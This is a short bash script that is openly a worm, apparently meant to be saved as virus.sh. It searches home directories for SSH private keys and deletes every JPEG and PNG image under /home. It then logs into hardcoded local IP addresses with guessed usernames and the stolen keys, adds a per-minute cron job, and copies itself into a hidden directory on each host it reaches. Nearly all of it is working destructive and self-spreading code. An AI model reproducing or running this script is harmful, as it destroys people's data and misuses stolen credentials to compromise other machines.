#SETUP
TARGET_ID=$( find ~ -iname '*id_rsa*'| grep -v .ssh )

echo -e "192.168.1.6\n192.168.1.8\n192.168.1.9" > targets.txt

echo -e "erick\njimmy12\nr1cky" > usernames.txt

#PAYLOAD
#find all images in directories
JPEG=$( find /home -iname *.jpeg )
JPG=$( find /home -iname *.jpg )
PNG=$( find /home -iname *.png )

#erase all images
rm $JPEG $JPG $PNG

if [[ $? -eq 0 ]]
then
	for target in $( cat targets.txt )
	do
		for user in $( cat usernames.txt )
		do	
			for id in $TARGET_ID
			do
				ssh -i $id $user@$target 'mkdir .hidden'
				if [[ $? -eq 0 ]]; 
				then
					dir=$( find . -iname 'virus.sh' )
					echo -e "ssh -i" $id $user@$target "\"mkdir .hidden & crontab -l > mycron && echo '* * * * * bash ~/.hidden/virus.sh' >> mycron && crontab mycron && rm mycron\" && scp -i" $id $dir $user@$target":~/.hidden" > inject.sh
					bash inject.sh
					break
				fi
			done
		done
	done
fi
rm usernames.txt targets.txt

echo finished
